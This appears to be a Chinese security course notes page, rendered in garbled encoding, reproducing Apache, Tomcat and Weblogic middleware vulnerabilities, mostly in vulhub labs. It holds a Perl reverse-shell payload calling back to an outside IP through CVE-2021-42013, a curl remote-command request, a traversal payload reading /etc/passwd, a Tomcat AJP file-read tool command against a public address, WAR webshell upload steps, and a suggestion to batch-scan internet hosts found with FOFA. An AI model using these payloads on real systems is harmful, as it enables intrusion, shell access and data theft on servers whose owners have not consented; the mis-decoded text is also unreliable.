<h4 id="ä¸­é—´ä»¶-Apache-RCE-ç›®å½•éå†-æ–‡ä»¶è§£æç­‰"><a href="#ä¸­é—´ä»¶-Apache-RCE-ç›®å½•éå†-æ–‡ä»¶è§£æç­‰" class="headerlink" title="ä¸­é—´ä»¶-Apache-RCE&amp;ç›®å½•éå†&amp;æ–‡ä»¶è§£æç­‰"></a>ä¸­é—´ä»¶-Apache-RCE&amp;ç›®å½•éå†&amp;æ–‡ä»¶è§£æç­‰</h4><p>Apache HTTP Serveræ˜¯ç¾å›½é˜¿å¸•å¥‡(Apache)åŸºé‡‘ä¼šçš„ä¸€æ¬¾å¼€æºç½‘é¡µæœåŠ¡å™¨ã€‚è¯¥æœåŠ¡å™¨<br>å…·æœ‰å¿«é€Ÿã€å¯é ä¸”å¯é€šè¿‡ç®€å•çš„APIè¿›è¡Œæ‰©å……çš„ç‰¹ç‚¹ï¼Œå‘ç°Apache HTTP Server2.4.50<br>ä¸­é’ˆå¯¹CVE-2021-41773çš„ä¿®å¤ä¸å¤Ÿå……åˆ†ã€‚æ”»å‡»è€…å¯ä»¥ä½¿ç”¨è·¯å¾„éå†æ”»å‡»å°†URLæ˜ å°„åˆ°<br>ç”±ç±»ä¼¼åˆ«åçš„æŒ‡ä»¤é…ç½®çš„ç›®å½•ä¹‹å¤–çš„æ–‡ä»¶ã€‚å¦‚æœè¿™äº›ç›®å½•ä¹‹å¤–çš„æ–‡ä»¶ä¸å—é€šå¸¸çš„é»˜è®¤é…ç½®<br>è¦æ±‚å…¨éƒ¨æ‹’ç»â€çš„ä¿æŠ¤ï¼Œåˆ™è¿™äº›è¯·æ±‚å¯èƒ½ä¼šæˆåŠŸã€‚å¦‚æœè¿˜ä¸ºè¿™äº›åˆ«åè·¯å¾„å¯ç”¨äº†CGå¼•è„š<br>æœ¬ï¼Œåˆ™è¿™å¯èƒ½å…è®¸è¿œç¨‹ä»£ç æ‰§è¡Œã€‚æ­¤é—®é¢˜ä»…å½±å“Apache2.4.49å’ŒApache2.4.50,è€Œä¸<br>å½±å“æ›´æ—©ç‰ˆæœ¬ã€‚</p>
<h6 id="1ã€Cve-2021-42013RCE"><a href="#1ã€Cve-2021-42013RCE" class="headerlink" title="1ã€Cve-2021-42013RCE"></a>1ã€Cve-2021-42013RCE</h6><p>P0ST &#x2F;cgi-bin.%%32%651.%%32%65&#x2F;.%%32%651.%%32%65bin&#x2F;sh<br>echo;perl -e â€˜use Socket:Si&#x3D;â€œ47.94.236.117â€;<br>Sp&#x3D;5566;socket(S,PF_INET,SOCK_STREAM,getprotobyname(â€œtcpâ€));if(connect(S,socka<br>ddr_in(Sp,inet_aton(Si))))<br>[open(STDIN,â€œ&gt;&amp;Sâ€):open(STDOUT,â€œ&gt;&amp;Sâ€);open(STDERR,â€œ&gt;&amp;Sâ€):exec(&#x2F;bin&#x2F;sh -iâ€)ğŸ˜‰</p>
<p>ä½¿ç”¨.%%32%65è¿›è¡Œç»•è¿‡ï¼ˆæ³¨æ„å…¶ä¸­çš„&#x2F;icons&#x2F;å¿…é¡»æ˜¯ä¸€ä¸ªå­˜åœ¨ä¸”å¯è®¿é—®çš„ç›®å½•ï¼‰ï¼š</p>
<p>å¯è§ï¼ŒæˆåŠŸè¯»å–åˆ°&#x2F;etc&#x2F;passwdï¼š</p>
<p>åœ¨æœåŠ¡ç«¯å¼€å¯äº†cgiæˆ–cgidè¿™ä¸¤ä¸ªmodçš„æƒ…å†µä¸‹ï¼Œè¿™ä¸ªè·¯å¾„ç©¿è¶Šæ¼æ´å°†å¯ä»¥æ‰§è¡Œä»»æ„å‘½ä»¤ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -v --data &quot;echo;id&quot; &#x27;http://your-ip:8080/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh&#x27;</span><br></pre></td></tr></table></figure>

<h6 id="2ã€CVE-2021-41773ç›®å½•ç©¿è¶Š"><a href="#2ã€CVE-2021-41773ç›®å½•ç©¿è¶Š" class="headerlink" title="2ã€CVE-2021-41773ç›®å½•ç©¿è¶Š"></a>2ã€CVE-2021-41773ç›®å½•ç©¿è¶Š</h6><p>Apache HTTP Server2.4.49ã€2.4.50ç‰ˆæœ¬å¯¹è·¯å¾„è§„èŒƒåŒ–æ‰€åšçš„æ›´æ”¹ä¸­å­˜åœ¨ä¸€ä¸ªè·¯å¾„ç©¿è¶Šæ¼<br>æ´ï¼Œæ”»å‡»è€…å¯åˆ©ç”¨è¯¥æ¼æ´è¯»å–åˆ°Wbç›®å½•å¤–çš„å…¶ä»–æ–‡ä»¶ï¼Œå¦‚ç³»ç»Ÿé…ç½®æ–‡ä»¶ã€ç½‘ç«™æºç ç­‰ï¼Œ<br>ç”šè‡³åœ¨ç‰¹å®šæƒ…å†µä¸‹ï¼Œæ”»å‡»è€…å¯æ„é€ æ¶æ„è¯·æ±‚æ‰§è¡Œå‘½ä»¤ï¼Œæ§åˆ¶æœåŠ¡å™¨ã€‚<br>Burp:ic0ns&#x2F;.%%32%65&#x2F;%%32%65%%32%65&#x2F;%%32%65%%32%65&#x2F;%%32%65%<br>%32%65&#x2F;etc&#x2F;passwd</p>
<h6 id="3ã€Cve-2017-15715æ–‡ä»¶è§£æ"><a href="#3ã€Cve-2017-15715æ–‡ä»¶è§£æ" class="headerlink" title="3ã€Cve-2017-15715æ–‡ä»¶è§£æ"></a>3ã€Cve-2017-15715æ–‡ä»¶è§£æ</h6><p>Apache HTTPD:æ˜¯ä¸€æ¬¾HTTPæœåŠ¡å™¨ã€‚å…¶2.4.0~2.4.29ç‰ˆæœ¬å­˜åœ¨ä¸€ä¸ªè§£ææ¼æ´ï¼Œåœ¨è§£æPHP<br>æ—¶ï¼Œ1.php\x0Aå°†è¢«æŒ‰ç…§PHPåç¼€è¿›è¡Œè§£æï¼Œå¯¼è‡´ç»•è¿‡ä¸€äº›æœåŠ¡å™¨çš„å®‰å…¨ç­–è·¯ã€‚</p>
<p>Cve-2017-15715æ–‡ä»¶è§£ææ¼æ´å¤ç°ï¼š</p>
<p>å¯åŠ¨ç¯å¢ƒ</p>
<p>åœ¨1.phpåé¢æ’å…¥ä¸€ä¸ª\x0Aï¼ˆæ³¨æ„ï¼Œä¸èƒ½æ˜¯\x0D\x0Aï¼Œåªèƒ½æ˜¯ä¸€ä¸ª\x0Aï¼‰ï¼Œä¸å†æ‹¦æˆª<br>æ³¨æ„æ·»åŠ çš„ä½ç½®ï¼Œå¯ä»¥å…ˆæ‰‹åŠ¨åœ¨æ–‡ä»¶åååŠ ç©ºæ ¼ï¼Œç„¶ååˆ‡æ¢åˆ°16è¿›åˆ¶å°†20æ”¹ä¸º0aã€‚</p>
<p>è®¿é—®åˆšæ‰ä¸Šä¼ çš„&#x2F;evil.php%0aï¼Œå‘ç°èƒ½å¤ŸæˆåŠŸè§£æï¼Œä½†è¿™ä¸ªæ–‡ä»¶ä¸æ˜¯phpåç¼€ï¼Œè¯´æ˜ç›®æ ‡å­˜åœ¨è§£ææ¼æ´ï¼š</p>
<p>4ã€Cve2017-9798ä»·å€¼ä¸é«˜<br>5ã€Cve_2018_11759ä»·å€¼ä¸é«˜I<br>6ã€Cve_2021-37580æ’ä»¶é—®é¢˜</p>
<h4 id="ä¸­é—´ä»¶Tomcat-å¼±å£ä»¤-æ–‡ä»¶ä¸Šä¼ -æ–‡ä»¶åŒ…å«ç­‰"><a href="#ä¸­é—´ä»¶Tomcat-å¼±å£ä»¤-æ–‡ä»¶ä¸Šä¼ -æ–‡ä»¶åŒ…å«ç­‰" class="headerlink" title="ä¸­é—´ä»¶Tomcat-.å¼±å£ä»¤&amp;æ–‡ä»¶ä¸Šä¼ &amp;æ–‡ä»¶åŒ…å«ç­‰"></a>ä¸­é—´ä»¶Tomcat-.å¼±å£ä»¤&amp;æ–‡ä»¶ä¸Šä¼ &amp;æ–‡ä»¶åŒ…å«ç­‰</h4><p>ç®€ä»‹ï¼š</p>
<blockquote>
<p>Tomcatæ˜¯Apacheè½¯ä»¶åŸºé‡‘ä¼šï¼ˆApache Software Foundationï¼‰çš„Jakartaé¡¹ç›®ä¸­çš„ä¸€ä¸ªæ ¸å¿ƒé¡¹ç›®ï¼Œç”±Apacheã€Sun å’Œå…¶ä»–ä¸€äº›å…¬å¸åŠä¸ªäººå…±åŒå¼€å‘è€Œæˆã€‚ç”±äºæœ‰äº†Sun çš„å‚ä¸å’Œæ”¯æŒï¼Œæœ€æ–°çš„Servlet å’ŒJSPè§„èŒƒæ€»æ˜¯èƒ½åœ¨Tomcat ä¸­å¾—åˆ°ä½“ç°ï¼ŒTomcat 5æ”¯æŒæœ€æ–°çš„Servlet 2.4 å’ŒJSP 2.0 è§„èŒƒã€‚å› ä¸ºTomcat æŠ€æœ¯å…ˆè¿›ã€æ€§èƒ½ç¨³å®šï¼Œè€Œä¸”å…è´¹ï¼Œå› è€Œæ·±å—Javaçˆ±å¥½è€…çš„å–œçˆ±å¹¶å¾—åˆ°äº†éƒ¨åˆ†è½¯ä»¶å¼€å‘å•†çš„è®¤å¯ï¼Œæˆä¸ºæ¯”è¾ƒæµè¡Œçš„Web åº”ç”¨æœåŠ¡å™¨ã€‚</p>
</blockquote>
<h6 id="1ã€å¼±å£ä»¤çŒœè§£"><a href="#1ã€å¼±å£ä»¤çŒœè§£" class="headerlink" title="1ã€å¼±å£ä»¤çŒœè§£"></a>1ã€å¼±å£ä»¤çŒœè§£</h6><p>é…ç½®ä¸å½“å¯¼è‡´åå°å¼±å£ä»¤ï¼Œå¯é€šè¿‡ä¸Šä¼ jspå‹ç¼©åŒ…æ”¹åçš„waræ‹¿shell</p>
<h5 id="å¼±å£ä»¤æ¼æ´å¤ç°"><a href="#å¼±å£ä»¤æ¼æ´å¤ç°" class="headerlink" title="å¼±å£ä»¤æ¼æ´å¤ç°"></a>å¼±å£ä»¤æ¼æ´å¤ç°</h5><p>vulhubå¯åŠ¨ç¯å¢ƒï¼š</p>
<p>è®¿é—®ip:8080 ç‚¹å‡»Manager APPç™»å½•ï¼Œå¼±å£ä»¤ä¸ºtomcat&#x2F;tomcat</p>
<p>getshellï¼šé¦–å…ˆä½¿ç”¨å“¥æ–¯æ‹‰ç”Ÿæˆjspåé—¨ï¼Œç„¶åå°†jspæ–‡ä»¶å‹ç¼©ä¸ºzipæ–‡ä»¶ï¼Œå†é€šè¿‡ä¿®æ”¹åç¼€çš„æ–¹å¼æ”¹ä¸º.waræ–‡ä»¶</p>
<p>åœ¨tomcatä¸Šä¼ ç‚¹ä¸Šä¼ waræ–‡ä»¶ï¼Œé€šè¿‡è¿”å›ä¿¡æ¯æŸ¥çœ‹ä¸Šä¼ çŠ¶æ€</p>
<p>è®¿é—®<a href="http://192.168.74.132/222/222.jsp">http://192.168.74.132/222/222.jsp</a> æ–‡ä»¶å­˜åœ¨ ï¼Œä½¿ç”¨å“¥æ–¯æ‹‰è¿æ¥è·å¾—æœåŠ¡å™¨æƒé™</p>
<h6 id="2ã€CVE-2017-12615æ–‡ä»¶ä¸Šä¼ "><a href="#2ã€CVE-2017-12615æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="2ã€CVE-2017-12615æ–‡ä»¶ä¸Šä¼ "></a>2ã€CVE-2017-12615æ–‡ä»¶ä¸Šä¼ </h6><p>å½“å­˜åœ¨æ¼æ´çš„Tomcatiè¿è¡Œåœ¨Nindows&#x2F;Linuxä¸»æœºä¸Šï¼Œä¸”å¯ç”¨äº†HTTP PUTè¯·æ±‚æ–¹æ³•ï¼ˆä¾‹<br>å¦‚ï¼Œå°†readonlyåˆå§‹åŒ–å‚æ•°ç”±é»˜è®¤å€¼è®¾ç½®ä¸ºfalse),æ”»å‡»è€…å°†æœ‰å¯èƒ½å¯é€šè¿‡ç²¾å¿ƒæ„é€ çš„<br>æ”»å‡»æƒ…æ±‚æ•°æ®åŒ…å‘æœåŠ¡å™¨ä¸Šä¼ åŒ…å«ä»»æ„ä»£ç çš„JSPçš„webshellæ–‡ä»¶ï¼ŒJSPæ–‡ä»¶ä¸­çš„æ¶æ„ä»£ç <br>å°†èƒ½è¢«æœåŠ¡å™¨æ‰§è¡Œï¼Œå¯¼è‡´æœåŠ¡å™¨ä¸Šçš„æ•°æ®æ³„éœ²æˆ–è·å–æœåŠ¡å™¨æƒé™ã€‚<br>å½±å“ç‰ˆæœ¬Apache Tomcat7.0.0-7.0.79<br>PUT &#x2F;1.jsp&#x2F;HTTP&#x2F;1.1<br>shellä»£ç </p>
<h6 id="3ã€cve-2020-1938æ–‡ä»¶åŒ…å«ï¼ˆè„šæœ¬æ‰§è¡Œï¼‰"><a href="#3ã€cve-2020-1938æ–‡ä»¶åŒ…å«ï¼ˆè„šæœ¬æ‰§è¡Œï¼‰" class="headerlink" title="3ã€cve-2020-1938æ–‡ä»¶åŒ…å«ï¼ˆè„šæœ¬æ‰§è¡Œï¼‰"></a>3ã€cve-2020-1938æ–‡ä»¶åŒ…å«ï¼ˆè„šæœ¬æ‰§è¡Œï¼‰</h6><p>Apache Tomcat AJPåè®®(é»˜è®¤8009ç«¯å£)ç”±äºå­˜åœ¨å®ç°ç¼ºé™·å¯¼è‡´ç›¸å…³å‚æ•°å¯æ§ï¼Œæ”»å‡»è€…<br>åˆ©ç”¨è¯¥æ¼æ´å¯é€šè¿‡æ„é€ ç‰¹å®šå‚æ•°ï¼Œè¯»å–æœåŠ¡å™¨vebappç›®å½•ä¸‹çš„ä»»æ„æ–‡ä»¶ã€‚è‹¥æœåŠ¡å™¨ç«¯åŒæ—¶<br>å­˜åœ¨æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½ï¼Œæ”»å‡»è€…å¯è¿›ä¸€æ­¥ç»“åˆæ–‡ä»¶åŒ…å«å®ç°è¿œç¨‹ä»£ç çš„æ‰§è¡Œã€‚<br>æ¼æ´å½±å“çš„äº§å“ç‰ˆæœ¬åŒ…æ‹¬ï¼š<br>Tomcat 6].*<br>Tomcat7.&lt;7.0.100<br>Tomcat8.&lt;8.5.51<br>Tomcat9.*&lt;9.0.31<br><a href="https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi">https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi</a><br>D:\Python27\python.exe CNVD-2020-10487-Tomcat-Ajp-lfi.py 123.58.236.76-p 63667-f<br>WEB-INF&#x2F;web.xml</p>
<h6 id="4ã€Cve202011996æ‹’ç»æœåŠ¡"><a href="#4ã€Cve202011996æ‹’ç»æœåŠ¡" class="headerlink" title="4ã€Cve202011996æ‹’ç»æœåŠ¡"></a>4ã€Cve202011996æ‹’ç»æœåŠ¡</h6><p>å±å®³è¿‡å¤§ï¼Œæƒé™æ— å…³ï¼Œæ„ä¹‰ä¸å¤§</p>
<h6 id="5ã€Cve20209484ååºåˆ—åŒ–"><a href="#5ã€Cve20209484ååºåˆ—åŒ–" class="headerlink" title="5ã€Cve20209484ååºåˆ—åŒ–"></a>5ã€Cve20209484ååºåˆ—åŒ–</h6><p>åˆ©ç”¨æ¡ä»¶å¤ªå¸åˆ»ï¼Œæ„ä¹‰ä¸å¤§</p>
<h4 id="ä¸­é—´ä»¶-Fofaviewer-Apache-RCE-èµ°å‘é«˜ç«¯å•Š"><a href="#ä¸­é—´ä»¶-Fofaviewer-Apache-RCE-èµ°å‘é«˜ç«¯å•Š" class="headerlink" title="ä¸­é—´ä»¶-Fofaviewer&amp;Apache_RCE-èµ°å‘é«˜ç«¯å•Š"></a>ä¸­é—´ä»¶-Fofaviewer&amp;Apache_RCE-èµ°å‘é«˜ç«¯å•Š</h4><p>server&#x3D;â€œApache&#x2F;2.4.49â€<br>è§†é¢‘ä¸­æœªè¿›è¡Œæ¼”ç¤ºæ¨æµ‹å…·ä½“çš„æµç¨‹ä¸ºï¼š<br>1ã€ä½¿ç”¨fofaviewè¿›è¡Œç›®æ ‡èµ„äº§æ”¶é›†<br>2ã€ç¼–å†™pythonè„šæœ¬è¿›è¡Œæ‰¹é‡åŒ–æ¼æ´æ¢æµ‹</p>
<h1 id="ç¬¬60å¤©-æœåŠ¡æ”»é˜²-ä¸­é—´ä»¶å®‰å…¨-CVEå¤ç°-Weblogic-Jenkins-GlassFish"><a href="#ç¬¬60å¤©-æœåŠ¡æ”»é˜²-ä¸­é—´ä»¶å®‰å…¨-CVEå¤ç°-Weblogic-Jenkins-GlassFish" class="headerlink" title="ç¬¬60å¤© æœåŠ¡æ”»é˜²-ä¸­é—´ä»¶å®‰å…¨&amp;CVEå¤ç°&amp;Weblogic&amp;Jenkins&amp;GlassFish"></a>ç¬¬60å¤© æœåŠ¡æ”»é˜²-ä¸­é—´ä»¶å®‰å…¨&amp;CVEå¤ç°&amp;Weblogic&amp;Jenkins&amp;GlassFish</h1><h4 id="çŸ¥è¯†ç‚¹ï¼š-40"><a href="#çŸ¥è¯†ç‚¹ï¼š-40" class="headerlink" title="çŸ¥è¯†ç‚¹ï¼š"></a>çŸ¥è¯†ç‚¹ï¼š</h4><p>ä¸­é—´ä»¶åŠæ¡†æ¶åˆ—è¡¨ï¼š<br>lIS,Apache,Nginx,Tomcat,Docker,Weblogic,JBoos,WebSphere,Jenkins,<br>GlassFish,Jira,Struts2,Laravel,Solr,Shiro,Thinkphp,Sprng,Flask,jQuery<br>1ã€<strong>ä¸­é—´ä»¶-Weblogicå®‰å…¨</strong>            â€”â€”â€”â€“æ„Ÿè§‰å…¶ä¸­æœ€é‡è¦çš„ä¸€ä¸ª<br>2ã€ä¸­é—´ä»¶JB00Så®‰å…¨<br>3ã€ä¸­é—´ä»¶-Jenkins:å®‰å…¨<br>4ã€ä¸­é—´ä»¶-GlassFishå®‰å…¨</p>
<h4 id="ç« èŠ‚å†…å®¹ï¼š-6"><a href="#ç« èŠ‚å†…å®¹ï¼š-6" class="headerlink" title="ç« èŠ‚å†…å®¹ï¼š"></a>ç« èŠ‚å†…å®¹ï¼š</h4><p>å¸¸è§ä¸­é—´ä»¶çš„å®‰å…¨æµ‹è¯•ï¼š<br>1ã€é…ç½®ä¸å½“-è§£æ&amp;å¼±å£ä»¤<br>2ã€å®‰å…¨æœºåˆ¶ç‰¹å®šå®‰å…¨æ¼æ´<br>3ã€å®‰å…¨æœºåˆ¶-å¼±å£ä»¤çˆ†ç ´æ”»å‡»<br>4ã€å®‰å…¨åº”ç”¨æ¡†æ¶ç‰¹å®šå®‰å…¨æ¼æ´</p>
<h4 id="å‰ç½®çŸ¥è¯†ï¼š-9"><a href="#å‰ç½®çŸ¥è¯†ï¼š-9" class="headerlink" title="å‰ç½®çŸ¥è¯†ï¼š"></a>å‰ç½®çŸ¥è¯†ï¼š</h4><p>ä¸­é—´ä»¶å®‰å…¨ä¾§è¯•æµç¨‹ï¼š<br>1ã€åˆ¤æ–­ä¸­é—´ä»¶ä¿¡æ¯åç§°&amp;ç‰ˆæœ¬&amp;ä¸‰æ–¹<br>2ã€åˆ¤æ–­ä»²é—´ä»¶é—®é¢˜-é…ç½®ä¸å½“&amp;å…¬å¼€æ¼æ´<br>3ã€åˆ¤æ–­ä¸­é—´ä»¶åˆ©ç”¨-å¼±å£ä»¤&amp;EXP&amp;æ¡†æ¶æ¼æ´<br>åº”ç”¨æœåŠ¡å®‰å…¨æµ‹è¯•æµç¨‹ï¼šè§å›¾<br>1ã€åˆ¤æ–­æœåŠ¡å¼€æ”¾æƒ…å†µç«¯å£æ‰«æ&amp;ç»„åˆåº”ç”¨ç­‰<br>2ã€åˆ¤æ–­æœåŠ¡ç±»å‹å½’å±æ•°æ®åº“&amp;æ–‡ä»¶ä¼ è¾“&amp;é€šè®¯ç­‰<br>3ã€åˆ¤æ–­æœåŠ¡åˆ©ç”¨æ–¹å¼æŒå®šæ¼æ´&amp;æœªæˆæƒ&amp;å¼±å£ä»¤ç­‰</p>
<h4 id="æ¼”ç¤ºæ¡ˆä¾‹-2"><a href="#æ¼”ç¤ºæ¡ˆä¾‹-2" class="headerlink" title="æ¼”ç¤ºæ¡ˆä¾‹"></a>æ¼”ç¤ºæ¡ˆä¾‹</h4><p>ä¸­é—´ä»¶Weblogic-å·¥å…·æœå“ˆ<br>ä¸­é—´ä»¶JBoos-å·¥å…·è„šæœ¬æœå“ˆ<br>ä¸­é—´ä»¶-Jenkins-å·¥å…·è„šæœ¬æœå“ˆ<br>ä¸­é—´ä»¶-GlassFish-å·¥å…·è„šæœ¬æœå“ˆ<br>é…åˆä¸‹-FofaViewer-.å·¥å…·è„šæœ¬æœå“ˆ</p>
<h5 id="1ã€ä¸­é—´ä»¶-Weblogic-CVE-ååºåˆ—åŒ–-è¿œç¨‹æ‰§è¡Œ"><a href="#1ã€ä¸­é—´ä»¶-Weblogic-CVE-ååºåˆ—åŒ–-è¿œç¨‹æ‰§è¡Œ" class="headerlink" title="1ã€ä¸­é—´ä»¶-Weblogic-CVE&amp;ååºåˆ—åŒ–&amp;è¿œç¨‹æ‰§è¡Œ"></a>1ã€ä¸­é—´ä»¶-Weblogic-CVE&amp;ååºåˆ—åŒ–&amp;è¿œç¨‹æ‰§è¡Œ</h5><p>â€‹        ç®€ä»‹ï¼šWeblogic æ˜¯ Oracle å…¬å¸æ¨å‡ºçš„ä¸€ä¸ªåŸºäºJAVAEEæ¶æ„çš„ä¸­é—´ä»¶ï¼Œèƒ½ä¸ºJAVAç¨‹åºæä¾›å¼€å‘ã€é›†æˆã€éƒ¨ç½²å’Œç®¡ç†ç­‰åŠŸèƒ½ã€‚</p>
<p>æ³¨ï¼šç”±äºä¸‹é¢çš„å‡ ä¸ªæ¼æ´å¤§éƒ¨åˆ†å¯ç›´æ¥ç”¨é›†æˆå·¥å…·ä¸€é”®æ¢æµ‹å¹¶åˆ©ç”¨ï¼Œå› æ­¤ä¸‹é¢åªä»‹ç»æ¼æ´è¯¦æƒ…ï¼Œå°±ä¸å¤ç°äº†ï¼Œä¸‹è½½é“¾æ¥å¦‚ä¸‹ï¼š</p>
<p>WeblogicTool-GUIæ¼æ´åˆ©ç”¨å·¥å…·<a href="https://github.com/KimJun1010/WeblogicTool">https://github.com/KimJun1010/WeblogicTool</a> ï¼Œæ”¯æŒæ¼æ´æ£€æµ‹ã€å‘½ä»¤æ‰§è¡Œã€å†…å­˜é©¬æ³¨å…¥ã€å¯†ç è§£å¯†ç­‰</p>
<p>æ­¤å·¥å…·éœ€è¦åœ¨java8ç¯å¢ƒä¸‹è¿è¡Œï¼Œæ£€æŸ¥javaç‰ˆæœ¬</p>
<h6 id="ï¼ˆ1ï¼‰-CVE-2017-3506-è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´"><a href="#ï¼ˆ1ï¼‰-CVE-2017-3506-è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´" class="headerlink" title="ï¼ˆ1ï¼‰ CVE-2017-3506  è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´"></a>ï¼ˆ1ï¼‰ CVE-2017-3506  è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´</h6><p>ç®€ä»‹ï¼š</p>
<pre><code>    Weblogicçš„WLS Securityç»„ä»¶å¯¹å¤–æä¾›webserviceæœåŠ¡ ï¼Œé‡Œé¢çš„XMLDecoderæ˜¯ç”¨æ¥è§£æç”¨æˆ·ä¼ å…¥çš„æ•°æ®ï¼Œè§£æçš„è¿‡ç¨‹ä¸­ï¼Œç”±äºå…¶ä¸­çš„WorkContextXmlInputAdapterç±»æ²¡æœ‰é™åˆ¶ä¼ å…¥çš„æ•°æ®ï¼Œä¼šå‡ºç°ååºåˆ—åŒ–æ¼æ´ï¼Œå¯¼è‡´å¯æ‰§è¡Œä»»æ„å‘½ä»¤ï¼Œå› æ­¤å¯è¢«æ”»å‡»è€…æ„é€ æ¶æ„ä»£ç æ‹¿åˆ°æƒé™ã€‚
</code></pre>
<p>å½±å“ç‰ˆæœ¬ï¼š</p>
<pre><code>    OracleWebLogic Server10.3.6.0.0

    OracleWebLogic Server12.1.3.0.0

    OracleWebLogic Server12.2.1.1.0

    OracleWebLogic Server12.2.1.2.0
</code></pre>
<p>åˆ¤æ–­æ–¹æ³•ï¼š</p>
<pre><code>    è®¿é—®ä»¥ä¸‹ç›®å½•ï¼Œé¡µé¢æœ‰è¿”å›æœåŠ¡ä¿¡æ¯åˆ™è¯´æ˜æˆ–è®¸å­˜åœ¨æ¼æ´
</code></pre>
<blockquote>
<p>&#x2F;wls-wsat&#x2F;CoordinatorPortType</p>
<p>&#x2F;wls-wsat&#x2F;RegistrationPortTypeRPC</p>
<p>&#x2F;wls-wsat&#x2F;ParticipantPortType</p>
<p>&#x2F;wls-wsat&#x2F;RegistrationRequesterPortType<br>&#x2F;wls-wsat&#x2F;CoordinatorPortType11</p>
<p>&#x2F;wls-wsat&#x2F;RegistrationPortTypeRPC11<br>&#x2F;wls-wsat&#x2F;ParticipantPortType11</p>
<p>&#x2F;wls-wsat&#x2F;RegistrationRequesterPortType11</p>
</blockquote>
<h6 id="ï¼ˆ2ï¼‰CVE-2018-2893-ååºåˆ—åŒ–æ¼æ´"><a href="#ï¼ˆ2ï¼‰CVE-2018-2893-ååºåˆ—åŒ–æ¼æ´" class="headerlink" title="ï¼ˆ2ï¼‰CVE-2018-2893  ååºåˆ—åŒ–æ¼æ´"></a>ï¼ˆ2ï¼‰CVE-2018-2893  ååºåˆ—åŒ–æ¼æ´</h6><p>ç®€ä»‹ï¼š</p>
<pre><code>    æ­¤æ¼æ´äº§ç”ŸäºWebLogic T3æœåŠ¡ï¼ŒT3åè®®åœ¨WebLogic Serverå’Œå®¢æˆ·ç«¯é—´æ‰¿å½“ä¼ è¾“æ•°æ®å’Œé€šä¿¡ä½œç”¨ï¼ŒWeblogicå¼€æ”¾ç«¯å£åT3ä¼šé»˜è®¤å¼€å¯ï¼ŒWebLogicæœåŠ¡å­˜åœ¨çš„æ¼æ´å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…é€šè¿‡T3è·å¾—æœåŠ¡å™¨æƒé™ã€‚
</code></pre>
<p>å½±å“ç‰ˆæœ¬ï¼š</p>
<pre><code>    WebLogic 10.3.6.0

    WebLogic 12.1.3.0

    WebLogic 12.2.1.2

    WebLogic 12.2.1.3
</code></pre>
<h6 id="ï¼ˆ3ï¼‰CVE-2018-3245-è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´"><a href="#ï¼ˆ3ï¼‰CVE-2018-3245-è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´" class="headerlink" title="ï¼ˆ3ï¼‰CVE-2018-3245  è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´"></a>ï¼ˆ3ï¼‰CVE-2018-3245  è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´</h6><p>ç®€ä»‹ï¼š</p>
<pre><code>    è¯¥æ¼æ´å’ŒCVE-2018-2893ç±»ä¼¼ï¼Œé€šè¿‡JRMPåè®®åˆ©ç”¨RMIæœºåˆ¶çš„ç¼ºé™·,è¿›è¡Œè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´çš„åˆ©ç”¨ã€‚æ”»å‡»è€…å¯æ„é€ æ¶æ„ä»£ç å¹¶é€šè¿‡T3è¿›è¡Œååºåˆ—åŒ–å®ç°è¿œç¨‹ä»£ç æ‰§è¡Œè·å–ç³»ç»Ÿæƒé™ã€‚
</code></pre>
<p>å½±å“ç‰ˆæœ¬ï¼š</p>
<pre><code>    Weblogic 10.3.6.0

    Weblogic 12.1.3.0

    Weblogic 12.2.1.3
</code></pre>
<p>åˆ¤æ–­æ–¹æ³•ï¼š</p>
<pre><code>    CVE-2018-3245-PoC
</code></pre>
<h6 id="ï¼ˆ4ï¼‰CVE-2020-14882-æœªæˆæƒå‘½ä»¤æ‰§è¡Œæ¼æ´"><a href="#ï¼ˆ4ï¼‰CVE-2020-14882-æœªæˆæƒå‘½ä»¤æ‰§è¡Œæ¼æ´" class="headerlink" title="ï¼ˆ4ï¼‰CVE-2020-14882 æœªæˆæƒå‘½ä»¤æ‰§è¡Œæ¼æ´"></a>ï¼ˆ4ï¼‰CVE-2020-14882 æœªæˆæƒå‘½ä»¤æ‰§è¡Œæ¼æ´</h6><p>ç®€ä»‹ï¼š</p>
<pre><code>    æ­¤æ¼æ´å¯è¢«æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…é€šè¿‡æ„é€ ç‰¹æ®Šçš„GETè¯·æ±‚è¿›è¡Œæ”»å‡»ï¼Œ
</code></pre>
<p>å½±å“ç‰ˆæœ¬ï¼š</p>
<pre><code>    Oracle Weblogic Server 10.3.6.0.0

    Oracle Weblogic Server 12.1.3.0.0

    Oracle Weblogic Server 12.2.1.3.0

    Oracle Weblogic Server 12.2.1.4.0

    Oracle Weblogic Server 14.1.1.0.0
</code></pre>
<p>WeblogicToolå¯ä»¥è¯†åˆ«å­˜åœ¨æ¼æ´ï¼Œä½†æ˜¯åˆ©ç”¨è¿™å—ç”¨ä¸äº†ï¼Œå°è¯•æ‰‹å·¥å¤ç°ä¸‹</p>
<p>æ‰“å¼€vulhubï¼Œè¿›å…¥&#x2F;weblogic&#x2F;CVE-2020-14882ï¼Œå¯åŠ¨å®¹å™¨</p>
<p>æ‰“å¼€è®¿é—®ç•Œé¢<a href="http://192.168.190.153:7001/console">http://192.168.190.153:7001/console</a></p>
<p>è¾“å…¥pocï¼Œå¯ç›´æ¥è¿›å…¥åå°,è¯´æ˜å­˜åœ¨æ¼æ´</p>
